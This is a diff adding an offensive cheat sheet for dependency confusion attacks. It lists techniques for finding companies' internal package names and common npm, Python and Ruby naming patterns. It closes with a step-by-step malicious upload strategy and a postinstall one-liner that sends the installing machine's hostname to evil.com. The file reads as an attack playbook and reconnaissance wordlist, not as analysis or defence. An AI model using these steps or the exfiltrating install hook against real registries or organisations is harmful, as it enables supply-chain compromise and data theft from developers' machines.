@@ -1,0 +1,63 @@
+# ============================================================
+# Dependency Confusion — Internal Package Name Patterns
+# ============================================================
+
+# ---- Discovery Techniques ----
+# 1. Check package.json, requirements.txt, build.gradle, pom.xml
+# 2. Check JavaScript bundle source maps for internal imports
+# 3. Search GitHub for: org:"COMPANY" filename:package.json
+# 4. Search npm/pypi for company name prefix packages
+
+# ---- Common Internal Package Naming Patterns ----
+@company/package-name
+@company/utils
+@company/shared
+@company/core
+@company/api
+@company/sdk
+@company/auth
+@company/config
+@company/logger
+@company/helpers
+company-internal
+company-utils
+company-core
+company-common
+company-auth
+company-sdk
+internal-utils
+internal-core
+internal-helpers
+private-utils
+corp-utils
+
+# ---- JavaScript / npm Scoped Packages ----
+@internal/
+@private/
+@corp/
+@org/
+@mycompany/
+@company-name/
+
+# ---- Python Internal Package Names ----
+company_utils
+company_internal
+company_auth
+internal_utils
+private_helpers
+
+# ---- Ruby Gem Internal Names ----
+company-internal
+company_utils
+internal_gem
+
+# ---- Detection via Error Messages ----
+# npm install → "Can't find package @company/utils" → try to publish it
+# pip install → "No matching distribution found for company-internal"
+
+# ---- Malicious Package Upload Strategy ----
+# 1. Identify internal package name from leaked source/config
+# 2. Register package on public registry with HIGHER version number
+# 3. Add install script (postinstall) to exfiltrate environment
+# package.json postinstall:
+#   "scripts": { "postinstall": "node -e \"require('http').get('https://evil.com/'+require('os').hostname())\"" }
